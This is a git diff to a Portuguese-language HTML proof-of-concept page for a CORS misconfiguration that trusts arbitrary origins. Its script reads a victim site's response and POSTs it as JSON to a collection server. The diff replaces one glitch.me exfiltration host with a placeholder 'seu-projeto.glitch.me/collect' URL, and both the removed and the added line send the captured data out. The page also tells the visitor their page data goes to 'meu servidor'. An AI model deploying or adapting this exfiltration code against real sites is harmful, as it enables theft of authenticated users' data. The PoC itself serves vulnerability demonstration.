@@ -29,8 +29,7 @@
 <body>
     <h1>PoC de CORS - Payload Alyce </h1>
     <p>Esta página demonstra a vulnerabilidade CORS com origem arbitrária confiável.</p>
-    <p>Abaixo demostra a interceptação das informações da sua pagina ^^.</p>
-
+    <p>Se Abaixo demostra a interceptação das informações da sua pagina enviadas pro meu servidor ^^.</p>
     <button onclick="validateCORS()">Verificar Vulnerabilidade</button>
 
     <div class="status" id="status">
@@ -53,7 +52,7 @@
                         statusDiv.style.backgroundColor = '#e0ffe0';
                         // Enviar dados para o servidor de coleta
                         var exfiltrate = new XMLHttpRequest();
-                        exfiltrate.open('POST', 'https://potent-intriguing-dichondra.glitch.me', true);
+                        exfiltrate.open('POST', 'https://seu-projeto.glitch.me/collect', true);
                         exfiltrate.setRequestHeader('Content-Type', 'application/json');
                         exfiltrate.send(JSON.stringify({data: xhr.responseText}));
                     } else {
@@ -75,3 +74,4 @@
     </script>
 </body>
 </html>
+
